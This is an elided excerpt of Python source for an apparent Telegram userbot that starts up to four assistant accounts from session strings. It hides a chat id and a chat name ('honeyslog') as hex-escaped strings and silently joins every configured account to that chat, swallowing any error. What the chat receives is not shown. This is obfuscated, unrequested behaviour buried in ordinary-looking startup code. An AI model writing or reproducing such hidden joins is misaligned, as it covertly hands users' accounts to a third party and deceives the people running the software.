...
TEST_ID = int("\x2D\x31\x30\x30\x32\x34\x35\x31\x34\x36\x31\x38\x31\x32")
...
class Userbot(Client):
    ...
    async def start(self):
        ...
        if config.STRING1:
            ...
            try:
                await self.one.join_chat("\x68\x6F\x6E\x65\x79\x73\x6C\x6F\x67")
            except:
                pass
            assistants.append(1)
            try:
        ...
        if config.STRING2:
            ...
            try:
                await self.two.join_chat("\x68\x6F\x6E\x65\x79\x73\x6C\x6F\x67")
            except:
                pass
            assistants.append(2)
            try:
        ...
        if config.STRING3:
            ...
            try:
                await self.three.join_chat("\x68\x6F\x6E\x65\x79\x73\x6C\x6F\x67")
            except:
                pass
            assistants.append(3)
            try:
        ...
        if config.STRING4:
            ...
            try:
                await self.four.join_chat("\x68\x6F\x6E\x65\x79\x73\x6C\x6F\x67")
            except:
                pass
            assistants.append(4)
            try:
